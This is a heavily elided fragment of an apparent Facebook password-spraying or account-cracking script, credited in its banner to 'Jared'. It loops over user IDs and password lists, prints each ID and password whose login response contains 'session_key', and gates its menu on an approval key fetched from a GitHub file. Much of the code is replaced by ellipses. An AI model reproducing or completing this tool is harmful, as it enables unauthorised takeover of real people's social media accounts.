...
------------------------------------------------------------------------
\33[1;36m ᴀᴜᴛʜᴏʀ    : Jared
\33[1;36m ᴠᴇʀsɪᴏɴ    : 0.01
\33[1;36m ғᴀᴄᴇʙᴏᴏᴋ  : Jared
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[JARED-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [JARED-OK] '+str(ids)+' | '+pas+'\033[1;97m')
...
def sub():
  ...
  clear()
  print(logo)
  r1=str(urlopen("https://github.com/jaredjared/jared/blob/main/approval.txt").read())
  if key1 in r1:
    os.system('clear')
    menu()
  else:
